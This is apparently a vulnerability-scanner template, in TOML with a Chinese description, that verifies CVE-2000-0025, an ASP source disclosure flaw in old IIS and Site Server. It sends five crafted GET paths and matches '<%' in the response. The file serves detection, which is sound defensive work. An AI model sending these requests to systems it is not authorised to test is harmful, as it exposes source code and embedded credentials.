[info]
author = "AVE"
description = "通过向IIS 4.0及Site Server 3.0中包含 .com/.exe/.sh/.cgi/.dll 扩展名的虚拟目录路径请求ASP文件，检测服务器是否返回ASP脚本源码而非执行结果。若响应包含 <% 等ASP代码标记，则确认存在此信息泄露漏洞。攻击者无需认证即可通过网络远程读取ASP源代码，获取数据库连接字符串、业务逻辑等敏感信息。"
id = "POC-AVE-2000-0024"
name = "Microsoft IIS 4.0 / Site Server 3.0 虚拟目录命名ASP源码泄露验证"
severity = "medium"
tags = [
    "cve-2000-0025",
    "iis",
    "information-disclosure",
    "asp",
]
vuln_id = [
    "CVE-2000-0025",
    "AVE-2000-0024",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/scripts.com/test.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<%"]

[[poc.requests]]
method = "GET"
path = "/iisadmin.exe/test.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<%"]

[[poc.requests]]
method = "GET"
path = "/cgi-bin.sh/test.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<%"]

[[poc.requests]]
method = "GET"
path = "/iissamples.dll/test.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<%"]

[[poc.requests]]
method = "GET"
path = "/_vti_bin.com/test.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<%"]
